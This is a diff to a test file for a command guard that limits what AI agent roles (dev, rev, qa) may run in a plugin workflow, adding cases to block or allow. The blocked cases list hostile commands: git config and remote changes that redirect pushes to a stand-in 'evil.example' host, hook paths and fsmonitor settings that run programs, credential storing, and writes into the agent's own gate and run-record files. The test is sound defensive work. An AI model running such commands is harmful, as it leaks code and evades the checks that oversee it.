@@ -1171,8 +1171,86 @@ READ_ONLY_READS = (
                                      "wget -O out.txt https://example.com"]]
 )
 
+# Security review: `cd ~`/`cd $HOME` into the data dir or run records, git config that
+# redirects pushes or runs programs, and `run init` are Lead-only.
+CD_HOME = (
+    [("dev", c, "block") for c in [
+        "cd ~/.claude/plugins/data/etk && echo x > p.json",
+        "cd $HOME/.claude/plugins && echo x > data/etk/p.json",
+        "cd ${HOME}/.claude/plugins && echo x > data/etk/p.json",
+        "cd ~/.claude && cd plugins && echo x > data/etk/p.json",
+        "cd ~/../r2/.etk && echo x > runs/a/gates.json",
+        "pushd ~/.claude/plugins/data/etk && touch p.json",
+        "cd ~ && rm -rf scratch",
+    ]]
+    + [("rev", "cd ~/.claude/plugins/data/etk && cat p.json", "block")]
+    + [(r, "cd ~ && ls", "allow") for r in ("dev", "rev", "qa")]
+    + [("dev", c, "allow") for c in ["cd $HOME && ls -la", "cd ~/notes && cat a.md"]]
+)
+GIT_REMOTE_CONFIG = (
+    [(r, c, "block") for r in ("dev", "qa") for c in [
+        "git config remote.origin.url https://github.com/victim/prod",
+        "git config remote.origin.pushurl https://evil.example/x.git",
+        "git config --add remote.origin.pushurl https://evil.example/x.git",
+        "git config --local Remote.Origin.PushURL x",
+        "git config url.https://evil.example/.insteadOf https://github.com/",
+        "git config --global url.x.pushInsteadOf https://github.com/",
+        "git config core.hooksPath /tmp/hooks",
+        "git config core.sshCommand 'ssh -o ProxyCommand=x'",
+        "git config core.fsmonitor ./watch.sh",
+        "git config filter.x.clean 'touch y'",
+        "git config diff.x.textconv cat",
+        "git config credential.helper store",
+        "git config include.path ../evil.cfg",
+        "git config includeIf.gitdir:~/.path ../evil.cfg",
+        "git config --file .git/config remote.origin.url x",
+        "git config -f=.git/config remote.origin.url x",
+        "git config --type=path core.hooksPath x",
+        "git config --type path core.hooksPath x",
+        "git config --unset core.hooksPath",
+        "git config --rename-section foo remote.origin",
+        "git config --remove-section remote.origin",
+        "git config --edit",
+        "git config set remote.origin.url x",
+        "git config unset remote.origin.pushurl",
+        "git -C . config remote.origin.url x",
+        "git remote add evil https://evil.example/x.git",
+        "git remote set-url origin https://evil.example/x.git",
+        "git remote set-url --push origin https://evil.example/x.git",
+        "git remote rename origin old",
+        "git remote remove origin",
+        "git remote rm origin",
+        "echo '[remote \"origin\"]' >> .git/config",
+        "cp x .git/hooks/pre-push",
+        "cd .git && echo x > config",
+    ]]
+    + [(r, c, "allow") for r in ("dev", "rev", "qa") for c in [
+        "git config --get remote.origin.url",
+        "git config remote.origin.url",
+        "git config --get-regexp '^remote\\.'",
+        "git config -l",
+        "git remote -v",
+        "git remote get-url --push origin",
+        "git remote show origin",
+        "cat .git/config",
+    ]]
+    + [("dev", c, "allow") for c in ["git config user.name 'Dev Bot'", "git config get remote.origin.url",
+                                     "git config --local core.autocrlf false"]]
+)
+ETK_INIT = (
+    [(r, c, "block") for r in ("dev", "qa", "rev") for c in [
+        'sh "${CLAUDE_PLUGIN_ROOT}/scripts/etk.sh" run init "Ship it" --kind ship',
+        "python3 scripts/etk_run.py init x",
+    ]]
+    + [(r, c, "allow") for r in ("dev", "rev") for c in [
+        'sh "${CLAUDE_PLUGIN_ROOT}/scripts/etk.sh" run ready',
+        "python3 scripts/etk_run.py ready",
+    ]]
+)
+
 CASES = (BENIGN + BASELINE_BLOCKS + R1_1_CD + R1_2_COMPOUND + PROCESS_SUBST + CD_UNKNOWN + SHELL_ARGV
-         + WRAPPER_OPTS + CD_FAIL_CLOSED + SHELL_CLUSTERS + WRAPPER_EDGES + CD_LATER_AND_BUILTINS + WRAPPER_EDGES_2 + TRAP_STRICT + STARTUP_VARS + NESTED_TIME_OUTPUT + BACKGROUND_CD + CREATED_OPERAND + GIT_CHECKOUT + GIT_DIR_AND_CLEAN + DEPLOY_FORMS + SECRET_WRITES + READ_ONLY_MUTATIONS + QA_LEAKS + FIND_WRITES + GIT_RUNS_PROGRAMS + PROTECTED + QUOTING + WRAPPER_CHDIR + ETK_EXEC + GIT_OPTIONS + GIT_ENV + ENV_LOOKALIKES + ETK_EXEC_FORMS + GIT_OTHER_OPTIONS + READ_ONLY_READS + NESTED_ENV)
+         + WRAPPER_OPTS + CD_FAIL_CLOSED + SHELL_CLUSTERS + WRAPPER_EDGES + CD_LATER_AND_BUILTINS + WRAPPER_EDGES_2 + TRAP_STRICT + STARTUP_VARS + NESTED_TIME_OUTPUT + BACKGROUND_CD + CREATED_OPERAND + GIT_CHECKOUT + GIT_DIR_AND_CLEAN + DEPLOY_FORMS + SECRET_WRITES + READ_ONLY_MUTATIONS + QA_LEAKS + FIND_WRITES + GIT_RUNS_PROGRAMS + PROTECTED + QUOTING + WRAPPER_CHDIR + ETK_EXEC + GIT_OPTIONS + GIT_ENV + ENV_LOOKALIKES + ETK_EXEC_FORMS + GIT_OTHER_OPTIONS + READ_ONLY_READS + NESTED_ENV
+         + CD_HOME + GIT_REMOTE_CONFIG + ETK_INIT)
 
 
 def make_project(base: Path) -> Path:
